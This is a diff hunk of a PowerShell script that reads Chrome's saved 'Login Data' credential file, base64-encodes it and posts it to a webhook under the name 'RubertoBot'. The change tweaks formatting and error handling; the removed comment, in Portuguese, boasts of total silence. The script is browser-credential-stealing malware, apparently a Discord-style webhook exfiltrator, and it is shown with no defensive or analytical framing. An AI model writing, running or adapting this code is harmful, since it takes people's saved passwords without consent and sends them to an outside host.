@@ -12,12 +12,13 @@ if (Test-Path $chromeLoginDataPath) {
 
         $body = @{
             username = "RubertoBot"
-            content = "```Base64 Chrome Login Data:`n$base64Data```"
+            content  = "```Base64 Chrome Login Data:`n$base64Data```"
         }
 
-        Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body
+    } catch {
+        Write-Host "Erro silencioso."
     }
-    catch {
-        # Silêncio total. Ruberto é sombra.
-    }
+} else {
+    Write-Host "Chrome Login Data não encontrado."
 }
